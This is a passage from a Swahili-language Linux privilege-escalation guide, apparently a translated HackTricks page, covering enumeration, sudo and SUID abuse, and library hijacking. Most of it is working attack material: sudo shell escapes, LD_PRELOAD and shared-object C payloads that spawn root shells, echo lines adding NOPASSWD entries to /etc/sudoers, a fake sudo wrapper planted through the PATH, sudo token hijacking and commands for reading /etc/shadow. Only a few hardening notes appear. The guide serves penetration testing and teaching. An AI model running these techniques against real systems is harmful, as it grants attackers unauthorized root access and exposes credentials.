D-Bus ni mfumo mgumu wa **inter-Process Communication (IPC)** unaowezesha applications kuingiliana na kushirikiana data kwa ufanisi. Umebuniwa kwa kuzingatia mfumo wa kisasa wa Linux, na hutoa mfumo imara kwa aina mbalimbali za mawasiliano ya applications.

Mfumo huu ni mwingiliano, unaounga mkono IPC za msingi zinazoongeza kubadilishana data kati ya michakato, ukikumbusha **enhanced UNIX domain sockets**. Zaidi ya hayo, husaidia katika kutangaza matukio au ishara, kukuza muunganisho laini kati ya vipengele vya mfumo. Kwa mfano, ishara kutoka kwa Bluetooth daemon kuhusu simu inayokuja inaweza kusababisha music player kutulia, kuboresha uzoefu wa mtumiaji. Aidha, D-Bus inasaidia mfumo wa remote object, unaorahisisha mahitaji ya huduma na invocation za method kati ya applications, kurahisisha michakato ambayo hapo awali ilikuwa ngumu.

D-Bus inafanya kazi kwa modeli ya allow/deny, ikisimamia ruhusa za ujumbe (method calls, signal emissions, nk.) kulingana na athari ya jumla ya sheria za sera zinazolingana. Sera hizi zinaelezea mwingiliano na bus, na zinaweza kuruhusu privilege escalation kupitia matumizi mabaya ya ruhusa hizi.

Mfano wa sera ya aina hiyo katika `/etc/dbus-1/system.d/wpa_supplicant.conf` umetolewa, ukielezea ruhusa za mtumiaji root kumiliki, kutuma, na kupokea ujumbe kutoka `fi.w1.wpa_supplicant1`.

Sera ambazo hazina mtumiaji au kundi maalum hutumika kwa ujumla, wakati sera za muktadha wa "default" zinaweza kutumika kwa wote wasiofunikwa na sera maalum nyingine.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Jifunze jinsi ya enumerate na exploit D-Bus communication hapa:**

{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mtandao**

Daima ni ya kuvutia ku enumerate mtandao na kubaini nafasi ya mashine.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Bandari zilizo wazi

Daima angalia huduma za mtandao zinazofanya kazi kwenye mashine ambazo hukuweza kuingiliana nazo kabla ya kufikia mashine hiyo:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Angalia ikiwa unaweza sniff traffic. Ikiwa unaweza, unaweza kuwa na uwezo wa kupata baadhi ya credentials.
```
timeout 1 tcpdump
```
## Watumiaji

### Uorodheshaji wa Kimsingi

Angalia **nani** wewe ni, ni **privileges** gani unazo, ni **users** gani wako kwenye mfumo, ni zipi zinaweza **login**, na ni zipi zina **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID Kubwa

Baadhi ya matoleo ya Linux yaliathiriwa na mdudu unaowawezesha watumiaji wenye **UID > INT_MAX** kuinua ruhusa. Maelezo zaidi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) na [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Vikundi

Angalia kama wewe ni a **mwanachama wa kikundi fulani** ambacho kinaweza kukupa ruhusa za root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Angalia kama kuna chochote cha kuvutia kilicho ndani ya clipboard (ikiwa inawezekana)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Sera ya Nywila
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Manenosiri yanayojulikana

Ikiwa unajua **nenosiri lolote** la mazingira, **jaribu kuingia kama kila mtumiaji** ukitumia nenosiri hilo.

### Su Brute

Ikiwa haufanyi wasiwasi kuhusu kutoa kelele nyingi na binaries za `su` na `timeout` zipo kwenye kompyuta, unaweza kujaribu ku-brute-force mtumiaji ukitumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) kwa parameter `-a` pia hujaribu ku-brute-force watumiaji.

## Matumizi mabaya ya PATH inayoweza kuandikwa

### $PATH

Ikiwa ugundua kwamba unaweza **kuandika ndani ya folda fulani ya $PATH** unaweza kuwa unaweza kupandisha vibali kwa **kuunda backdoor ndani ya folda inayoweza kuandikika** kwa jina la amri ambayo itaendeshwa na mtumiaji tofauti (root ikiwezekana) na ambayo **haitapakiwa kutoka kwenye folda iliyoko kabla** ya folda yako inayoweza kuandikika katika $PATH.

### SUDO and SUID

Unaweza kupewa ruhusa kuendesha amri fulani ukitumia sudo au zinaweza kuwa na suid bit. Angalia kwa kutumia:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Baadhi ya **amri zisizotarajiwa zinakuwezesha kusoma na/au kuandika faili au hata kutekeleza amri.** Kwa mfano:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Mipangilio ya Sudo yanaweza kumruhusu mtumiaji kutekeleza amri fulani kwa kutumia ruhusa za mtumiaji mwingine bila kujua nywila.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Katika mfano huu mtumiaji `demo` anaweza kuendesha `vim` kama `root`, sasa ni rahisi kupata shell kwa kuongeza ufunguo wa `ssh` kwenye saraka ya `root` au kwa kuita `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Maelekezo haya yanamruhusu mtumiaji **kuweka variable ya mazingira** wakati anatekeleza kitu:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Mfano huu, **inayotokana na mashine ya HTB Admirer**, ulikuwa **nyeti** kwa **PYTHONPATH hijacking** ambayo iliruhusu kupakia maktaba yeyote ya python wakati script ikiendeshwa kama root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV imehifadhiwa kupitia sudo env_keep → root shell

Ikiwa sudoers inahifadhi `BASH_ENV` (mfano, `Defaults env_keep+="ENV BASH_ENV"`), unaweza kutumia tabia ya kuanzisha ya Bash isiyo ya kuingiliana ili kuendesha msimbo wowote kama root unapoita amri inayoruhusiwa.

- Kwa nini inafanya kazi: Kwa non-interactive shells, Bash huchambua `$BASH_ENV` na hushirikisha faili hiyo kabla ya kuendesha script lengwa. Kanuni nyingi za sudo zinaruhusu kuendesha script au shell wrapper. Ikiwa `BASH_ENV` imetunzwa na sudo, faili yako inashirikishwa kwa ruhusa za root.

- Mahitaji:
- Sudo rule unayoweza kuendesha (lengo lolote linaloitaja `/bin/bash` non-interactively, au script yoyote ya bash).
- `BASH_ENV` kuwepo katika `env_keep` (angalia kwa `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Kuimarisha:
- Ondoa `BASH_ENV` (na `ENV`) kutoka `env_keep`, badala yake tumia `env_reset`.
- Epuka shell wrappers kwa amri zinazoruhusiwa na sudo; tumia minimal binaries.
- Fikiria sudo I/O logging na alerting wakati preserved env vars zinapotumika.

### Njia za bypassing utekelezaji wa sudo

**Ruka** kusoma faili nyingine au tumia **symlinks**. Kwa mfano katika faili ya sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ikiwa **wildcard** imetumika (\*), ni rahisi zaidi:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Hatua za kujikinga**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bila njia ya amri

Iwapo **sudo permission** imetolewa kwa amri moja **bila kubainisha njia**: _hacker10 ALL= (root) less_ unaweza ku-exploit kwa kubadilisha variable ya PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Njia hii pia inaweza kutumika ikiwa binary ya **suid** **inatekeleza amri nyingine bila kutaja path yake (daima angalia kwa** _**strings**_ **maudhui ya binary ya SUID isiyo ya kawaida)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary na command path

Ikiwa binary ya **suid** **inatekeleza amri nyingine kwa kutaja path**, basi, unaweza kujaribu **export a function** iitwayo kwa jina la amri ambayo faili ya suid inaiita.

Kwa mfano, ikiwa binary ya suid inaita _**/usr/sbin/service apache2 start**_ you have to try to create the function and export it:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Kisha, unapoita suid binary, funsi hii itaendeshwa

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia kipengele hiki kutumiwa vibaya, hasa kwa executables za **suid/sgid**, mfumo unaweka masharti fulani:

- The loader disregards **LD_PRELOAD** for executables where the real user ID (_ruid_) does not match the effective user ID (_euid_).
- For executables with suid/sgid, only libraries in standard paths that are also suid/sgid are preloaded.

Privilege escalation can occur if you have the ability to execute commands with `sudo` and the output of `sudo -l` includes the statement **env_keep+=LD_PRELOAD**. This configuration allows the **LD_PRELOAD** environment variable to persist and be recognized even when commands are run with `sudo`, potentially leading to the execution of arbitrary code with elevated privileges.
```
Defaults        env_keep += LD_PRELOAD
```
Hifadhi kama **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Kisha **compile it** ukitumia:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Mwishowe, **escalate privileges** ukiendesha
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Privesc sawa inaweza kutumika vibaya ikiwa mshambulizi anadhibiti **LD_LIBRARY_PATH** env variable kwa sababu anadhibiti njia ambapo libraries zitatafutwa.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Unapokutana na binary yenye ruhusa za **SUID** ambazo zinaonekana zisizo za kawaida, ni desturi nzuri kuthibitisha kama inapakia faili za **.so** ipasavyo. Hii inaweza kukaguliwa kwa kuendesha amri ifuatayo:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Kwa mfano, kupata hitilafu kama _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ kunaonyesha uwezekano wa exploitation.

Ili exploit hii, mtu angeendelea kwa kuunda faili ya C, sema _"/path/to/.config/libcalc.c"_, yenye msimbo ufuatao:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Msimbo huu, mara tu ukichanganuliwa (compiled) na kutekelezwa (executed), unalenga kuongeza privileges kwa kubadilisha ruhusa za faili na kutekeleza shell yenye privileges zilizoinuliwa.

Tengeneza (compile) C file iliyotajwa juu kuwa shared object (.so) file kwa kutumia:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Hatimaye, kuendesha SUID binary iliyoharibika kunapaswa kuchochea exploit, kuruhusu uwezekano wa kuvunjwa kwa usalama wa mfumo.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sasa tunapokuwa tumepata SUID binary inayopakia library kutoka kwenye folda tunaoweza kuandika, hebu tuunde library katika folda hiyo kwa jina linalohitajika:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ikiwa unapata hitilafu kama vile
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
hii inamaanisha kwamba maktaba uliyotengeneza inahitaji kuwa na function inayoitwa `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyochaguliwa ya Unix binaries ambazo zinaweza kutumiwa na mshambuliaji kuvuka vikwazo vya usalama vya eneo. [**GTFOArgs**](https://gtfoargs.github.io/) ni sawa lakini kwa kesi ambapo unaweza **kuingiza vigezo tu** katika amri.

Mradi unakusanya kazi halali za Unix binaries ambazo zinaweza kutumika vibaya kuvunja restricted shells, kuongeza au kudumisha elevated privileges, kuhamisha files, kuzalisha bind na reverse shells, na kurahisisha kazi zingine za post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

Katika matukio ambapo una **sudo access** lakini huna nenosiri, unaweza kuongeza privileges kwa **kusubiri utekelezaji wa amri ya sudo kisha ku-hijack session token**.

Mahitaji ya kuongeza privileges:

- Tayari una shell kama mtumiaji "_sampleuser_"
- "_sampleuser_" ame **tumia `sudo`** kutekeleza kitu katika **dakika 15 zilizopita** (kwa default hiyo ndiyo muda wa sudo token unaoturuhusu kutumia `sudo` bila kuingiza nenosiri)
- `cat /proc/sys/kernel/yama/ptrace_scope` ni 0
- `gdb` inapatikana (unaweza kuiweka/upload)

(Unaweza kwa muda kuwezesha `ptrace_scope` kwa kutumia `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kwa kudumu kubadilisha `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)

Ikiwa mahitaji yote yamekamilika, **uweza kuongeza privileges kwa kutumia:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. Unaweza kuitumia **kuactivate the sudo token in your session** (hautapata moja kwa moja root shell, fanya `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **exploit ya pili** (`exploit_v2.sh`) itaunda sh shell katika _/tmp_ **inamilikiwa na root yenye setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **exploit ya tatu** (`exploit_v3.sh`) **itaunda faili ya sudoers** ambayo inafanya **sudo tokens** kuwa ya milele na kuwawezesha watumiaji wote kutumia **sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Kama una **ruhusa za kuandika** kwenye folda au kwenye yoyote ya faili zilizotengenezwa ndani ya folda unaweza kutumia binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ku**unda token ya sudo kwa mtumiaji na PID**.\
Kwa mfano, ikiwa unaweza kuandika juu ya faili _/var/run/sudo/ts/sampleuser_ na una shell kama mtumiaji huyo mwenye PID 1234, unaweza **kupata ruhusa za sudo** bila ya kuhitaji kujua password kwa kufanya:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

The file `/etc/sudoers` and the files inside `/etc/sudoers.d` configure who can use `sudo` and how. These files **kwa chaguo-msingi zinaweza kusomwa tu na mtumiaji root na kundi root**.\
**Ikiwa** unaweza **kusoma** faili hii unaweza kuwa na uwezo wa **kupata taarifa za kuvutia**, na ikiwa unaweza **kuandika** faili yoyote utaweza **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ikiwa unaweza kuandika, unaweza kutumia vibaya ruhusa hii.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Njia nyingine ya kutumia vibaya ruhusa hizi:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Kuna baadhi ya mbadala kwa binary ya `sudo` kama `doas` kwa OpenBSD, kumbuka kuangalia usanidi wake katika `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ikiwa unajua kwamba **mtumiaji kawaida huunganishwa kwenye mashine na hutumia `sudo`** ili kuongeza ruhusa na umepata shell ndani ya muktadha wa mtumiaji huyo, unaweza **kutengeneza executable mpya ya sudo** ambayo itatekeleza msimbo wako kama root kisha amri ya mtumiaji. Kisha, **badilisha $PATH** ya muktadha wa mtumiaji (kwa mfano kwa kuingiza njia mpya katika .bash_profile) ili anapotekeleza sudo, executable yako ya sudo itatekelezwa.

Kumbuka kwamba ikiwa mtumiaji anatumia shell tofauti (si bash) utahitaji kubadilisha faili nyingine ili kuongeza njia mpya. Kwa mfano[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) inabadilisha `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine katika [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Au kuendesha kitu kama:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Maktaba Iliyoshirikiwa

### ld.so

The file `/etc/ld.so.conf` indicates **kutoka wapi faili za usanidi zilizosomwa**. Typically, this file contains the following path: `include /etc/ld.so.conf.d/*.conf`

That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be read. This configuration files **zinaonyesha folda nyingine** ambapo **maktaba** zitakuwa **zikitafutwa**. For example, the content of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **Hii ina maana kwamba mfumo utatafuta maktaba ndani ya `/usr/local/lib`**.

If for some reason **mtumiaji ana ruhusa za kuandika** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
Tazama **jinsi ya kufaidi usanidi huu usio sahihi** kwenye ukurasa ufuatao:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kwa kunakili lib ndani ya `/var/tmp/flag15/` itatumika na programu mahali hapa kama ilivyoainishwa katika thamani ya `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Kisha tengeneza maktaba ya uovu katika `/var/tmp` kwa kutumia `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Uwezo

Linux capabilities hutoa **sehemu ndogo ya idhini za root kwa mchakato**. Hii kwa ufanisi inavunja idhini za root kuwa **vitengo vidogo na vitofauti**. Kila kimoja cha vitengo hivi kinaweza kisha kupewa mchakato kwa kujitegemea. Kwa njia hii seti kamili ya idhini inapunguzwa, ikipunguza hatari za kutumiwa vibaya.\
Soma ukurasa ufuatao ili **kujifunza zaidi kuhusu uwezo na jinsi ya kuzitumia vibaya**:

{{#ref}}
linux-capabilities.md
{{#endref}}

## Ruhusa za saraka

Katika saraka, **bit for "execute"** inaashiria kuwa mtumiaji aliyeathiriwa anaweza "**cd**" kuingia ndani ya saraka.\
Kipengee cha **"read"** kinaashiria kuwa mtumiaji anaweza kuorodhesha **faili**, na kipengee cha **"write"** kinaashiria mtumiaji anaweza **kufuta** na **kuunda** **faili** mpya.

## ACLs

Access Control Lists (ACLs) zinawakilisha safu ya pili ya ruhusa za hiari, zenye uwezo wa **kupitisha ruhusa za jadi za ugo/rwx**. Ruhusa hizi zinaboresha udhibiti wa upatikanaji wa faili au directory kwa kuruhusu au kukataa haki kwa watumiaji maalum ambao si wamiliki au sehemu ya kikundi. Kiwango hiki cha **undani kinahakikisha usimamizi sahihi zaidi wa upatikanaji**. Maelezo zaidi yanaweza kupatikana [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Mpa** mtumiaji "kali" read na write ruhusa juu ya faili:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pata** faili zilizo na ACLs maalum kutoka kwenye mfumo:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Fungua shell sessions

Katika **matoleo ya zamani** unaweza **hijack** baadhi ya **shell** session za mtumiaji tofauti (**root**).\
Katika **matoleo ya hivi karibuni** utaweza **kuungana** na screen sessions za **mtumiaji wako mwenyewe** tu. Hata hivyo, unaweza kupata **taarifa za kuvutia ndani ya session**.

### screen sessions hijacking

**Orodhesha screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Unganisha kwenye kikao**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Kupora vikao vya tmux

Hii ilikuwa tatizo kwa **matoleo ya zamani ya tmux**. Sikuweza kuiba kikao cha tmux (v2.1) kilichoundwa na root nikiwa mtumiaji asiye na ruhusa.

**Orodhesha vikao vya tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Ambatisha kwenye session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Angalia **Valentine box from HTB** kwa mfano.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
Hitilafu hii hutokea wakati wa kuunda ssh key mpya katika OS hizo, kwa sababu **tu 32,768 variations zilitumika**. Hii ina maana kwamba uwezekano wote unaweza kuhesabiwa na **ukiwa na ssh public key unaweza kutafuta private key inayolingana**. Unaweza kupata uwezekano uliohesabiwa hapa: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Inaeleza kama password authentication inaruhusiwa. Chaguo-msingi ni `no`.
- **PubkeyAuthentication:** Inaeleza kama public key authentication inaruhusiwa. Chaguo-msingi ni `yes`.
- **PermitEmptyPasswords**: Wakati password authentication inaruhusiwa, inaeleza kama server inaruhusu kuingia kwenye akaunti zenye password tupu. Chaguo-msingi ni `no`.

### PermitRootLogin

Inaeleza kama root anaweza kuingia kwa kutumia ssh, chaguo-msingi ni `no`. Thamani zinazowezekana:

- `yes`: root anaweza kuingia kwa kutumia password na private key
- `without-password` or `prohibit-password`: root anaweza kuingia tu kwa private key
- `forced-commands-only`: Root anaweza kuingia tu kwa private key na ikiwa options za commands zimeelezwa
- `no` : hapana

### AuthorizedKeysFile

Inaeleza faili zinazobeba public keys ambazo zinaweza kutumika kwa user authentication. Inaweza kuwa na tokens kama `%h`, ambazo zitabadilishwa na home directory. **Unaweza kuonyesha absolute paths** (zinazoanza na `/`) au **relative paths kutoka home ya mtumiaji**. Kwa mfano:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Mipangilio hiyo itaonyesha kwamba ikiwa utajaribu kuingia kwa kutumia funguo ya **private** ya mtumiaji "**testusername**", ssh italinganisha public key ya funguo yako na zile zilizopo katika `/home/testusername/.ssh/authorized_keys` na `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding inakuruhusu **use your local SSH keys instead of leaving keys** (without passphrases!) kukaa kwenye server yako. Hivyo, utaweza **jump** kupitia ssh **to a host** na kutoka hapo **jump to another** host **using** the **key** iliyoko kwenye **initial host** yako.

Unahitaji kuweka chaguo hili katika `$HOME/.ssh.config` kama ifuatavyo:
```
Host example.com
ForwardAgent yes
```
Kumbuka kwamba ikiwa `Host` ni `*`, kila wakati mtumiaji anaporuka kwenda kwenye mashine tofauti, host hiyo itaweza kufikia vifunguo (ambayo ni tatizo la usalama).

Faili `/etc/ssh_config` inaweza **kubatilisha** chaguzi hizi na kuruhusu au kukataa usanidi huu.\
Faili `/etc/sshd_config` inaweza **kuruhusu** au **kukataa** ssh-agent forwarding kwa neno muhimu `AllowAgentForwarding` (chaguo-msingi ni kuruhusu).

Ikiwa utagundua kuwa Forward Agent imewekwa kwenye mazingira, soma ukurasa ufuatao kwa kuwa **huenda ukaweza kuibitumia vibaya ili kupandisha ruhusa**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Faili za Kuvutia

### Faili za profile

Faili `/etc/profile` na faili zilizo chini ya `/etc/profile.d/` ni **skripti zinazotekelezwa wakati mtumiaji anapoendesha shell mpya**. Kwa hiyo, ikiwa unaweza **kuandika au kubadilisha yoyote kati yao unaweza kupandisha ruhusa**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ikiwa skripti ya profaili isiyokuwa ya kawaida inapopatikana, unapaswa kuikagua kwa ajili ya **maelezo nyeti**.

### Passwd/Shadow Files

Kulingana na OS faili za `/etc/passwd` na `/etc/shadow` zinaweza kuwa zikitumia jina tofauti au kunaweza kuwa na nakala ya chelezo. Kwa hivyo inashauriwa **kutafuta zote** na **kuangalia kama unaweza kusoma** ili kuona **ikiwa kuna hashes** ndani ya faili:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
